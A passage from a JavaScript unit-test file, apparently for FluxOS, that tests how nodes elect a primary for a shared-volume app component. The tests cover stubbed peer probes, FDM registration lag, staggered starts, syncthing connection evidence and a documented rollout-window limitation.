    });

    describe('isElectedPrimaryHere answers in three states', () => {
      // Finding 25 of the review: the true path had no coverage at all, and the
      // false path could not be told apart from "the election never ran". Each
      // test uses its own app name because the election tables are module state
      // that outlives a sinon restore.
      const runElection = async (appName, fdmResponse) => {
        sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
        const runPass = electionFixture(appName, ['192.168.1.90:16127']);
        axiosGetStub.resetBehavior();
        axiosGetStub.callsFake(peerAnswers({ held: [] }));
        serviceHelperStub.resetBehavior();
        serviceHelperStub.resolves(fdmResponse);
        await runPass();
      };
      const namesThisNode = { data: { status: 'success', data: { ips: ['192.168.1.5'] } } };
      const namesAnotherNode = { data: { status: 'success', data: { ips: ['192.168.1.90'] } } };
      const namesNobody = { data: [] };

      it('is true when the election named this node', async () => {
        await runElection('electedhereapp', namesThisNode);

        expect(advancedWorkflows.isElectedPrimaryHere('electedhereapp', '192.168.1.5:16127')).to.equal(true);
      });

      it('matches the <component>_<app> identifier that v4+ specs elect on', async () => {
        // The election keys a composed app on `<component>_<app>`, and the
        // lookup is asked for the bare app name. Nothing exercised the
        // endsWith half of that match before.
        sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
        const runPass = electionFixture('composedapp', ['192.168.1.90:16127'], { componentName: 'server' });
        axiosGetStub.resetBehavior();
        axiosGetStub.callsFake(peerAnswers({ held: [] }));
        serviceHelperStub.resetBehavior();
        serviceHelperStub.resolves(namesThisNode);

        await runPass();

        expect(advancedWorkflows.isElectedPrimaryHere('composedapp', '192.168.1.5:16127')).to.equal(true);
      });

      it('is false when the election named a different node', async () => {
        await runElection('electedelsewhereapp', namesAnotherNode);

        expect(advancedWorkflows.isElectedPrimaryHere('electedelsewhereapp', '192.168.1.5:16127')).to.equal(false);
      });

      it('is null for an app the election has never reached', async () => {
        expect(advancedWorkflows.isElectedPrimaryHere('neverelectedapp', '192.168.1.5:16127')).to.equal(null);
      });

      it('is null when FDM answered but named nobody', async () => {
        // The ~110s registration lag: FDM reports no primary while an instance
        // is live, so on a node running the component this is "cannot say",
        // not "you are not it".
        await runElection('noprimaryyetapp', namesNobody);

        expect(advancedWorkflows.isElectedPrimaryHere('noprimaryyetapp', '192.168.1.5:16127')).to.equal(null);
      });

      it('goes null once the verdict is older than the election that refreshes it', async () => {
        // The election re-runs every masterSlaveIntervalMs. A verdict older
        // than a run of those cycles means it has stopped - which is what
        // happens while syncthing is unhealthy - and a stopped election must
        // not keep answering from its last known state.
        await runElection('staleverdictapp', namesThisNode);
        const aDayLater = Date.now() + (24 * 60 * 60 * 1000);

        expect(advancedWorkflows.isElectedPrimaryHere('staleverdictapp', '192.168.1.5:16127')).to.equal(true);
        expect(advancedWorkflows.isElectedPrimaryHere('staleverdictapp', '192.168.1.5:16127', aDayLater)).to.equal(null);
      });

      it('says so when no FDM region answered, instead of reading it as "no primary"', async () => {
        // The `if (!fdmOk)` guard was unreachable: getMasterIpFromFdm returned
        // fdmOk true on every path, so a total outage and an app with no
        // primary produced the same verdict and this warning never appeared.
        const logWarn = sinon.stub(log, 'warn');
        sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
        const runPass = electionFixture('fdmdownapp', ['192.168.1.90:16127']);
        axiosGetStub.resetBehavior();
        axiosGetStub.callsFake(peerAnswers({ held: [] }));
        serviceHelperStub.resetBehavior();
        serviceHelperStub.rejects(new Error('getaddrinfo ENOTFOUND'));

        await runPass();

        expect(linesMatching(logWarn, 'All FDM services failed')).to.have.lengthOf(1);
        expect(advancedWorkflows.isElectedPrimaryHere('fdmdownapp', '192.168.1.5:16127')).to.equal(null);
      });
    });

    it('does not start at index 0 while a peer is already running the component', async () => {
      const appName = 'peerbusyapp';
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
      const logInfo = sinon.stub(log, 'info');
      const runPass = electionFixture(appName, ['192.168.1.90:16127']);
      serviceHelperStub.resolves(fdmNoPrimary()); // FDM: no primary registered yet

      // the peer IS running it - FDM simply has not caught up yet
      axiosGetStub.resetBehavior();
      axiosGetStub.callsFake(peerAnswers({ held: [`flux${appName}`] }));

      await runPass();

      expect(linesMatching(logInfo, 'a peer is already running it')).to.have.lengthOf(1);
      expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(0);
    });

    it('starts at index 0 when no peer is running the component', async () => {
      const appName = 'peerfreeapp';
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
      const logInfo = sinon.stub(log, 'info');
      const runPass = electionFixture(appName, ['192.168.1.90:16127']);
      serviceHelperStub.resolves(fdmNoPrimary());

      // peer answers, and is NOT running the component
      axiosGetStub.resetBehavior();
      axiosGetStub.callsFake(peerAnswers({ held: ['fluxsomethingelse'] }));

      await runPass();

      expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(1);
      expect(linesMatching(logInfo, 'a peer is already running it')).to.have.lengthOf(0);
    });

    it('does not re-elect a component this node stood down to hand its app back', async () => {
      // THE MECHANISM. Without this exclusion the election undoes the stand-down
      // within one cycle and every cycle after it: the component is not running
      // here, this node's own stale primary record is cleared, no peer has taken
      // it up yet, and the index-0 branch starts it straight back. The node then
      // never leaves and the app is restarted every 30s forever.
      //
      // Stood down through the real give-up pass rather than by reaching into
      // module state, so the two halves are proven to agree on the identifier.
      const appName = 'standdownapp';
      const componentName = 'server';
      const identifier = `${componentName}_${appName}`;
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);

      const generalService = require('../../ZelBack/src/services/generalService');
      const appUninstaller = require('../../ZelBack/src/services/appLifecycle/appUninstaller');
      const evacuationSafety = require('../../ZelBack/src/services/appLifecycle/appEvacuationSafety');
      const residentialNodeDosService = require('../../ZelBack/src/services/residentialNodeDosService');
      const registryManager = require('../../ZelBack/src/services/appDatabase/registryManager');
      const appQueryService = require('../../ZelBack/src/services/appQuery/appQueryService');
      const dockerService = require('../../ZelBack/src/services/dockerService');

      sinon.stub(generalService, 'checkSynced').resolves(true);
      sinon.stub(appUninstaller, 'removeAppLocally').resolves();
      sinon.stub(registryManager, 'getApplicationGlobalSpecifications').resolves({ name: appName, version: 8 });
      sinon.stub(appQueryService, 'listRunningApps').resolves({ status: 'success', data: [{ Names: [`/flux${identifier}`] }] });
      sinon.stub(residentialNodeDosService, 'isEvacuating').returns(true);
      sinon.stub(residentialNodeDosService, 'mayEvacuateApp').returns({ ok: true, reason: 'ready' });
      sinon.stub(residentialNodeDosService, 'forgetAppObservation');
      sinon.stub(residentialNodeDosService, 'noteEvacuated');
      sinon.stub(evacuationSafety, 'canSafelyRemoveApp').resolves({
        safe: false, code: 'STAND_DOWN_REQUIRED', reason: 'stop the component first', standDown: [identifier],
      });
      const stopStub = sinon.stub(dockerService, 'appDockerStop').resolves();
      sinon.stub(dbHelper, 'findInDatabase').resolves([{ name: appName, instances: 3 }]);
      // The give-up pass runs before electionFixture arms this, and a pass that
      // cannot learn its own address returns before it reaches the safety gate.
      fluxNetworkHelperStub.resolves('192.168.1.5:16127');
      registryManagerStub.resolves([{ name: appName, ip: '192.168.1.5:16127', runningSince: '2026-01-01T00:00:00.000Z' }]);

      await advancedWorkflows.checkAndRemoveApplicationInstance();
      sinon.assert.calledWith(stopStub, identifier);
      sinon.assert.notCalled(appUninstaller.removeAppLocally);

      const logInfo = sinon.stub(log, 'info');
      const runPass = electionFixture(appName, [], { componentName });
      serviceHelperStub.resolves({ data: [] });
      axiosGetStub.resetBehavior();
      axiosGetStub.callsFake(peerAnswers({ held: [] }));

      await runPass();

      expect(linesMatching(logInfo, 'standing down to be handed back')).to.have.lengthOf(1);
      expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(0);
    });

    it('seeds a confirmed leader even when a stagger was already scheduled for it', async () => {
      // The election runs on its own cadence and the state machine confirms the
      // leader on another, so a pass can schedule the stagger before the leadership
      // is known. A seed that then defers to that schedule waits index*3min on peers
      // that cannot become ready, which is the wait the claim exists to skip.
      const appName = 'seedafterscheduleapp';
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
      const logInfo = sinon.stub(log, 'info');
      const cache = new Map([[`flux${appName}`, { restarted: true }]]);
      const runPass = electionFixture(
        appName,
        ['192.168.1.90:16127', '192.168.1.91:16127'],
        { selfRunningSince: '2026-01-01T00:02:30.000Z', receiveOnlyCache: cache },
      );
      serviceHelperStub.resolves(fdmNoPrimary());
      axiosGetStub.resetBehavior();
      axiosGetStub.callsFake(peerAnswers({ held: [] }));

      // pass one: not yet the confirmed leader, so the stagger gets scheduled
      await runPass();
      expect(linesMatching(logInfo, 'scheduling app')).to.have.lengthOf(1);

      // pass two: leadership confirmed. The pending schedule must not hold it back.
      logInfo.resetHistory();
      cache.get(`flux${appName}`).designatedLeader = true;
      await runPass();

      expect(linesMatching(logInfo, 'seeds without the index stagger')).to.have.lengthOf(1);
    });

    it('does not start when a peer has committed to the component but has no container yet', async () => {
      // The masterSlave primary path fixes ownership on the persistent data before
      // it starts anything, so a committed peer legitimately has no container for
      // that whole window. Asked only for containers it answers "free", and this
      // node starts a second writer on the shared volume.
      const appName = 'peerclaimedapp';
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
      const logInfo = sinon.stub(log, 'info');
      const runPass = electionFixture(appName, ['192.168.1.90:16127']);
      serviceHelperStub.resolves(fdmNoPrimary());

      // holds the component, runs no containers at all
      axiosGetStub.resetBehavior();
      axiosGetStub.callsFake(peerAnswers({ held: [`flux${appName}`], running: [] }));

      await runPass();

      expect(linesMatching(logInfo, 'is held on peer node')).to.have.lengthOf(1);
      expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(0);
    });

    it('falls back to the running-container check against a peer that cannot answer heldcomponents', async () => {
      // The fleet is mixed for the length of a rollout. A peer that cannot serve the
      // endpoint must be asked the old way; reading its 404 as "holds nothing" is
      // the same second-writer start, arrived at from the other direction.
      const appName = 'peeroldapp';
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
      const logInfo = sinon.stub(log, 'info');
      const runPass = electionFixture(appName, ['192.168.1.90:16127']);
      serviceHelperStub.resolves(fdmNoPrimary());

      axiosGetStub.resetBehavior();
      axiosGetStub.callsFake(peerAnswers({ held: null, running: [{ Names: [`/flux${appName}`] }] }));

      await runPass();

      expect(linesMatching(logInfo, 'is running on peer node')).to.have.lengthOf(1);
      expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(0);
    });

    it('starts over an operator-stopped peer that is too old to say so - the rollout window, pinned deliberately', async () => {
      // THIS IS THE LIMITATION, NOT THE BEHAVIOUR WE WANT. It is asserted so that
      // it cannot be changed by accident, and so the next person to touch the
      // fall-through has to decide about it rather than discover it.
      //
      // /apps/heldcomponents landed on development; the released line does not
      // have it, and is 356 commits behind. A released node CAN hold the durable
      // operator-stop lock and DOES honour it - it simply has no route with which
      // to report it, so it answers 404.
      //
      // A 404 is a peer answering the old way, so the probe falls through to the
      // container list. The owner's container is stopped, so it is not in that
      // list, and this node reads the component as free and starts it: a second
      // writer on the shared volume while its owner edits files on the first.
      //
      // There is nothing better to ask - a peer cannot answer a question its code
      // does not contain, and reading the 404 as "holds nothing" would be the same
      // start reached from the other direction. The hole closes only when the last
      // node upgrades (~4h per release), and the harness cannot reproduce it:
      // createTestEnv's legacyNodes toggles ArcaneOS vs legacy, i.e. the platform,
      // not the FluxOS version.
      //
      // The test above covers the 404 fall-through only for a peer that IS running
      // the component, where the container list happens to give the right answer.
      // This is the case where it does not.
      const appName = 'peeroldstoppedapp';
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
      const logInfo = sinon.stub(log, 'info');
      const runPass = electionFixture(appName, ['192.168.1.90:16127']);
      serviceHelperStub.resolves(fdmNoPrimary());

      axiosGetStub.resetBehavior();
      // 404 to heldcomponents, and an empty container list - which is exactly what
      // a released node whose owner has stopped this component looks like.
      axiosGetStub.callsFake(peerAnswers({ held: null, running: [] }));

      await runPass();

      expect(
        linesMatching(logInfo, 'starting docker component'),
        'the rollout exposure changed - a released peer holding the lock is now being ruled out, or the fall-through moved',
      ).to.have.lengthOf(1);
    });

    it('will not start against a peer whose held-components answer is an in-band error', async () => {
      // FluxOS reports failures inside a 200, so a peer that HAS the endpoint and
      // could not serve it looks, by shape alone, like a peer too old to have it -
      // and the old-peer path falls back to the container list.
      // That fallback cannot see the durable stop lock at all. So a peer whose lock
      // store is unreadable would report an owner-stopped primary as free, and this
      // node would elect itself onto the volume that owner is working on. The
      // container list here says free, and the pass must still refuse.
      const appName = 'peerunreadableapp';
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
      const logInfo = sinon.stub(log, 'info');
      const runPass = electionFixture(appName, ['192.168.1.90:16127']);
      serviceHelperStub.resolves(fdmNoPrimary());

      axiosGetStub.resetBehavior();
      axiosGetStub.callsFake((url) => (url.includes('/apps/heldcomponents')
        ? Promise.resolve({ data: { status: 'error', data: { name: 'Error', message: 'no primary available' } } })
        : Promise.resolve({ data: { data: [] } })));

      await runPass();

      expect(linesMatching(logInfo, 'could not answer what it holds')).to.have.lengthOf(1);
      expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(0);
    });

    it('claims the component before the ownership fix, and releases it once the attempt ends', async () => {
      // The claim has to be taken BEFORE the slow pre-start work, or it does not
      // cover the window it exists for. Releasing it at the end is safe: a start
      // that got as far as controllerDesired is held by that from then on, and one
      // that failed must stop claiming rather than block the fleet.
      const appName = 'claimlifecycleapp';
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
      const appReconciler = require('../../ZelBack/src/services/appMonitoring/appReconciler');
      const claimStarting = sinon.stub(appReconciler, 'claimStarting');
      const releaseStarting = sinon.stub(appReconciler, 'releaseStarting');
      const setControllerDesired = sinon.stub(appReconciler, 'setControllerDesired');
      const runPass = electionFixture(appName, ['192.168.1.90:16127']);
      serviceHelperStub.resolves(fdmNoPrimary());
      axiosGetStub.resetBehavior();
      axiosGetStub.callsFake(peerAnswers({ held: [] })); // nobody holds it - we start

      await runPass();

      // The start is deliberately not awaited by the election pass, so the release
      // lands after it returns - wait for the attempt to finish rather than racing
      // it. Waited on THIS app: earlier tests leave their own starts in flight, and
      // any-call-happened is satisfied by one of those landing here.
      const releasedThisApp = () => releaseStarting.getCalls().some((c) => c.args[0] === appName);
      for (let tick = 0; tick < 100 && !releasedThisApp(); tick += 1) {
        // eslint-disable-next-line no-await-in-loop
        await new Promise((resolve) => { setTimeout(resolve, 20); });
      }

      sinon.assert.calledWith(claimStarting, appName);
      sinon.assert.calledWith(releaseStarting, appName);
      // the claim precedes any pre-start work, and outlives it
      sinon.assert.callOrder(claimStarting, releaseStarting);
      if (setControllerDesired.called) {
        sinon.assert.callOrder(claimStarting, setControllerDesired, releaseStarting);
      }
    });

    it('does not mistake a longer-named app on a peer for this component', async () => {
      // The peer runs `<app>1`, a different app whose name merely starts the same
      // way - simplexsmp against simplexsmp1 on the live network. A substring test
      // reads that as this component being live and declines to start, forever.
      const appName = 'prefixapp';
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
      const logInfo = sinon.stub(log, 'info');
      const runPass = electionFixture(appName, ['192.168.1.90:16127']);
      serviceHelperStub.resolves(fdmNoPrimary());

      axiosGetStub.resetBehavior();
      // answered the OLD way, so the whole-name comparison is what is under test
      axiosGetStub.callsFake(peerAnswers({ running: [{ Names: [`/flux${appName}1`] }] }));

      await runPass();

      expect(linesMatching(logInfo, 'a peer is already running it')).to.have.lengthOf(0);
      expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(1);
    });

    it('probes every peer, not just lower-index ones, before a designated leader leaves the stagger', async () => {
      // The seed claim exists precisely to leave the index stagger, so the
      // lower-index probe that serialises the staggered starts is the wrong set
      // to ask: a peer ABOVE us in the order is the one it cannot see, and FDM's
      // registration lag means nothing else reports that peer as live either.
      // Starting anyway puts a second writer on the syncthing-shared volume.
      const appName = 'seedjumpapp';
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
      const logInfo = sinon.stub(log, 'info');
      const cache = new Map([[`flux${appName}`, { restarted: true, designatedLeader: true }]]);
      const runPass = electionFixture(
        appName,
        ['192.168.1.90:16127', '192.168.1.91:16127', '192.168.1.92:16127'],
        { selfRunningSince: '2026-01-01T00:02:30.000Z', receiveOnlyCache: cache },
      );
      serviceHelperStub.resolves(fdmNoPrimary()); // FDM: no primary registered yet

      // Order: .90 (00:01), .91 (00:02), this node (00:02:30), .92 (00:03). Only
      // .92 - the peer above us, invisible to a lower-index probe - is running it.
      axiosGetStub.resetBehavior();
      axiosGetStub.callsFake(async (url) => (url.includes('192.168.1.92')
        ? peerAnswers({ held: [`flux${appName}`] })(url)
        : peerAnswers({ held: [] })(url)));

      await runPass();

      expect(linesMatching(logInfo, 'a peer is already running it')).to.have.lengthOf(1);
      expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(0);
    });

    it('spends the seed claim on the pass that uses it, so it cannot outlive genesis', async () => {
      // designatedLeader describes genesis, and the state machine stops
      // republishing it the moment the folder goes sendreceive - manageFolderSyncState
      // returns on its already-syncing branch and never reaches the election again,
      // so nothing retracts a claim left standing. This node would then skip the
      // stagger on every later primary loss, for the life of the process.
      const appName = 'seedspentapp';
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
      const logInfo = sinon.stub(log, 'info');
      const appId = `flux${appName}`;
      const cache = new Map([[appId, { restarted: true, designatedLeader: true }]]);
      const runPass = electionFixture(
        appName,
        ['192.168.1.90:16127', '192.168.1.91:16127'],
        { selfRunningSince: '2026-01-01T00:02:30.000Z', receiveOnlyCache: cache },
      );
      serviceHelperStub.resolves(fdmNoPrimary());
      axiosGetStub.resetBehavior();
      axiosGetStub.resolves({ data: { data: [] } }); // no peer is running it

      await runPass();

      expect(linesMatching(logInfo, 'seeds without the index stagger')).to.have.lengthOf(1);
      expect(cache.get(appId).designatedLeader).to.equal(false);

      // and the next pass is an ordinary staggered candidate again
      logInfo.resetHistory();
      await runPass();

      expect(linesMatching(logInfo, 'seeds without the index stagger')).to.have.lengthOf(0);
      expect(linesMatching(logInfo, 'scheduling app')).to.have.lengthOf(1);
    });

    it('probes every peer at once, so an unreachable fleet costs one timeout and not N', async () => {
      const appName = 'peerconcurrentapp';
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
      const runPass = electionFixture(appName, [
        '192.168.1.90:16127', '192.168.1.91:16127', '192.168.1.92:16127',
      ]);
      serviceHelperStub.resolves(fdmNoPrimary());

      // Hold every probe open and release them only once all have been issued.
      // Probing one peer at a time cannot get past the first: its await never
      // settles, so the second request is never sent and the count stays at 1.
      // That is the shape being pinned - probed serially, an unreachable fleet
      // blocks the promotion for the SUM of its peers' timeouts, on a path that
      // re-runs every 30s until the component is actually running.
      const release = [];
      axiosGetStub.resetBehavior();
      axiosGetStub.callsFake(() => new Promise((resolve) => { release.push(resolve); }));

      const pass = runPass();
      for (let tick = 0; tick < 50 && axiosGetStub.callCount < 3; tick += 1) {
        // eslint-disable-next-line no-await-in-loop
        await new Promise((resolve) => { setImmediate(resolve); });
      }

      expect(axiosGetStub.callCount).to.equal(3);

      release.forEach((resolve) => resolve({ data: { data: [] } }));
      await pass;
    });

    it('leaves a silent peer alone while this node\'s syncthing still holds a connection to it', async () => {
      // The FluxOS restart window. FluxOS and the container fail independently: the
      // peer's API is gone for tens of seconds while its syncthing and its container
      // carry on writing, so the silence is the strongest reason to suspect the peer
      // IS running the component. In-fleet, six seconds of it was enough to start a
      // second writer on the shared volume.
      const appName = 'restartingpeerapp';
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
      const logInfo = sinon.stub(log, 'info');
      const runPass = electionFixture(appName, ['192.168.1.90:16127']);
      serviceHelperStub.resolves(fdmNoPrimary());
      // the peer answers nothing at all (the axios default), but its sync connection
      // to this node is open
      peerSyncthingSays('192.168.1.90:16127', 'valid');

      await runPass();

      expect(linesMatching(logInfo, 'still holds a live connection to it')).to.have.lengthOf(1);
      expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(0);
    });

    it('will not start beside a silent peer it cannot ask its own syncthing about', async () => {
      // The correlated restart: this node's own process cycled while the peer was
      // already down, so it never resolved the peer's device and has no view of it
      // either way. The node with the least knowledge must not be the one that
      // authorises a second writer - absence of evidence authorises nothing.
      const appName = 'unknownpeerapp';
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
      const logInfo = sinon.stub(log, 'info');
      const runPass = electionFixture(appName, ['192.168.1.90:16127']);
      serviceHelperStub.resolves(fdmNoPrimary());
      // no device cached for the peer, and the peer answers nothing

      await runPass();

      expect(linesMatching(logInfo, 'cannot ask its own syncthing about it')).to.have.lengthOf(1);
      expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(0);
    });

    it('starts once a silent peer\'s sync connection is gone and this node can still see the fleet', async () => {
      // The other direction, and the one that stops this becoming a stall: a peer
      // that is genuinely down loses its sync connection, and that IS evidence. The
      // start proceeds without waiting for the location record to expire.
      const appName = 'deadpeerapp';
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
      const logInfo = sinon.stub(log, 'info');
      const runPass = electionFixture(appName, ['192.168.1.90:16127']);
      serviceHelperStub.resolves(fdmNoPrimary());
      peerSyncthingSays('192.168.1.90:16127', 'unknown');

      await runPass();

      expect(linesMatching(logInfo, 'the component is free there')).to.have.lengthOf(1);
      expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(1);
    });

    it('resolves a dead peer\'s device from this node\'s own syncthing when the cache never learned it', async () => {
      // The device cache is in memory and is filled by asking the PEER, so it is
      // empty for exactly the peer that matters: one that died while this node's own
      // process was restarting. Without the on-disk fallback this node would call
      // itself ignorant and hold the app down until the dead peer's location record
      // expired - up to the full broadcast lifetime, for a peer it had a perfectly
      // good local record of.
      const appName = 'diskdeviceapp';
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
      const logInfo = sinon.stub(log, 'info');
      const runPass = electionFixture(appName, ['192.168.1.90:16127']);
      serviceHelperStub.resolves(fdmNoPrimary());
      // nothing cached, but this node's syncthing still has the device configured
      // under the name the monitor gave it, and reports the connection closed
      syncthingDevicesStub.resolves([{ name: '192.168.1.90:16127', deviceID: 'DEVICE-DEAD-PEER' }]);
      syncthingCompletionStub.resolves({ remoteState: 'unknown' });

      await runPass();

      expect(linesMatching(logInfo, 'the component is free there')).to.have.lengthOf(1);
      expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(1);
    });

    it('will not start when a silent peer\'s connection is gone but this node cannot see the fleet either', async () => {
      // A dead peer and a live peer on the far side of a split this node is the
      // small end of look identical from here - in both, the peer is silent and its
      // sync connection has dropped. The proportional floor is the only thing that
      // separates them, and below it the peer is very likely still serving.
      const appName = 'isolatedselfapp';
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
      const logInfo = sinon.stub(log, 'info');
      const runPass = electionFixture(appName, ['192.168.1.90:16127']);
      serviceHelperStub.resolves(fdmNoPrimary());
      peerSyncthingSays('192.168.1.90:16127', 'unknown');
      const fluxCommunication = require('../../ZelBack/src/services/fluxCommunication');
      fluxCommunication.peerResponsiveness.returns({ responding: 1, total: 8 });

      await runPass();

      expect(linesMatching(logInfo, 'cannot see the fleet either')).to.have.lengthOf(1);
      expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(0);
    });

    it('will not start beside a peer that answered with an error status', async () => {
      // A peer that answered anything is alive, and "cannot say" is not "is not
      // running it". The evidence path must not be reached at all here: a live peer
      // whose sync connection happens to be down would otherwise read as free.
      const appName = 'erroringpeerapp';
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
      const logInfo = sinon.stub(log, 'info');
      const runPass = electionFixture(appName, ['192.168.1.90:16127']);
      serviceHelperStub.resolves(fdmNoPrimary());
      axiosGetStub.resetBehavior();
      axiosGetStub.rejects(Object.assign(new Error('Request failed with status code 500'), { response: { status: 500 } }));
      peerSyncthingSays('192.168.1.90:16127', 'unknown');

      await runPass();

      expect(linesMatching(logInfo, 'alive, and cannot be ruled out')).to.have.lengthOf(1);
      expect(linesMatching(logInfo, 'the component is free there')).to.have.lengthOf(0);
      expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(0);
    });

    it('holds the start on one unreadable peer even when every other peer answers', async () => {
      // Peers answering "not me" say nothing about the one that did not answer.
      // Folding the set as "some peer is free" rather than "every peer was ruled
      // out" is how a single blind spot becomes a start.
      const appName = 'onedarkpeerapp';
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
      const logInfo = sinon.stub(log, 'info');
      const runPass = electionFixture(
        appName,
        ['192.168.1.90:16127', '192.168.1.91:16127', '192.168.1.92:16127'],
      );
      serviceHelperStub.resolves(fdmNoPrimary());
      axiosGetStub.resetBehavior();
      axiosGetStub.callsFake(async (url) => (url.includes('192.168.1.92')
        ? Promise.reject(new Error('peer unreachable'))
        : peerAnswers({ held: [] })(url)));

      await runPass();

      expect(linesMatching(logInfo, 'could not be ruled out')).to.have.lengthOf(1);
      expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(0);
    });

    it('holds a due schedule rather than dropping it when a lower-index node cannot be read', async () => {
      // The two ways of not starting are not the same. A lower-index node that IS
      // running it settles the question, and the schedule is spent. A lower-index
      // node this node could not read settles nothing - dropping the schedule there
      // sends this node back through a fresh index * 3min wait for a peer it may be
      // able to read on the very next pass.
      const appName = 'holdscheduleapp';
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
      const logInfo = sinon.stub(log, 'info');
      const runPass = electionFixture(
        appName,
        ['192.168.1.90:16127'],
        { selfRunningSince: '2026-01-01T00:02:00.000Z' },
      );
      serviceHelperStub.resolves(fdmNoPrimary());
      // Only Date is faked: the schedule is compared against Date.now(), and faking
      // the timer functions as well would take the probe's own cancel timers with it.
      const clock = sinon.useFakeTimers({ now: Date.now(), toFake: ['Date'] });

      // Pass 1: index 1 behind an answering peer, so this node schedules its stagger.
      axiosGetStub.resetBehavior();
      axiosGetStub.callsFake(peerAnswers({ held: [] }));
      await runPass();
      expect(linesMatching(logInfo, 'scheduling app')).to.have.lengthOf(1);

      // Pass 2: the schedule is due, and now the lower-index peer cannot be read.
      clock.tick(3 * 60 * 1000);
      logInfo.resetHistory();
      axiosGetStub.resetBehavior();
      axiosGetStub.rejects(new Error('lower-index node unreachable'));
      await runPass();
      expect(linesMatching(logInfo, 'holding the scheduled start')).to.have.lengthOf(1);
      expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(0);

      // Pass 3 discriminates: the schedule is still there and still due, so this pass
      // re-probes immediately. Had it been dropped, this node would be scheduling a
      // fresh stagger instead.
      logInfo.resetHistory();
      await runPass();
      expect(linesMatching(logInfo, 'holding the scheduled start')).to.have.lengthOf(1);
      expect(linesMatching(logInfo, 'scheduling app')).to.have.lengthOf(0);
    });

    it('asks every peer when a booked turn comes due at index 0, instead of asking nobody', async () => {
      // The stagger serialises candidates by index, so a due turn only checks the
      // nodes AHEAD of this one. At index 0 there are none, and "nobody ahead" was
      // read as "nobody" - a start issued without a single peer being asked.
      //
      // Reaching it takes three things at once, which is why it is rare rather than
      // impossible: a remembered primary (so the index-0 branch, which probes every
      // peer, is skipped), a booked turn (so the previous-primary branch, which
      // requires none, is skipped), and index 0 by the time the turn is due. The
      // turn is booked at index >= 2 and index is re-derived from the location list
      // every pass, so the instances ahead ageing out is all it takes.
      //
      // What makes it harmful is FDM's registration lag: for ~110s after a node
      // starts, FDM still reports no primary. A less-senior node can be live and
      // invisible throughout, and starting beside it puts two writers on the volume.
      const appName = 'duestagger0app';
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
      const logInfo = sinon.stub(log, 'info');
      // Index 2: behind two peers, and far enough back to book a turn rather than
      // start at once (at index 1 the wait computes to zero).
      const runPass = electionFixture(
        appName,
        ['192.168.1.90:16127', '192.168.1.91:16127'],
        { selfRunningSince: '2026-01-01T00:03:00.000Z' },
      );
      const clock = sinon.useFakeTimers({ now: Date.now(), toFake: ['Date'] });

      // Pass 1: FDM names a primary, so this node remembers one. Nothing else happens
      // - it is a standby with no container.
      serviceHelperStub.resolves({ data: { status: 'success', data: { ips: ['192.168.1.90'] } } });
      await runPass();

      // Pass 2: the primary is gone from FDM. The previous-primary branch probes it,
      // finds it free, and books this node's turn one place back.
      serviceHelperStub.resolves(fdmNoPrimary());
      axiosGetStub.resetBehavior();
      axiosGetStub.callsFake(peerAnswers({ held: [] }));
      await runPass();
      expect(linesMatching(logInfo, 'will start docker app')).to.have.lengthOf(1);

      // Both instances ahead of this one age out of the location list. This node is
      // now index 0 and still holds the turn it booked at index 2.
      registryManagerStub.resolves([
        { name: appName, ip: '192.168.1.5:16127', runningSince: '2026-01-01T00:03:00.000Z' },
        { name: appName, ip: '192.168.1.92:16127', runningSince: '2026-01-01T00:04:00.000Z' },
      ]);

      // The turn comes due, and a LESS senior node is running the component - the
      // FDM-lag window. Only a probe can see it; FDM still says there is no primary.
      clock.tick(config.fluxapps.masterSlaveStaggerMs);
      logInfo.resetHistory();
      axiosGetStub.resetBehavior();
      axiosGetStub.callsFake(peerAnswers({ held: [`flux${appName}`] }));
      await runPass();

      expect(linesMatching(logInfo, 'is held on peer node')).to.have.lengthOf(1);
      expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(0);
    });

    it('leaves the staggered order alone when there IS a node ahead to ask', async () => {
      // The escalation above must not turn every due turn into a fleet-wide probe:
      // at index 1 the node ahead is the one the stagger exists to defer to, and
      // asking it alone is the whole point of the lower-only scope.
      const appName = 'duestagger1app';
      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
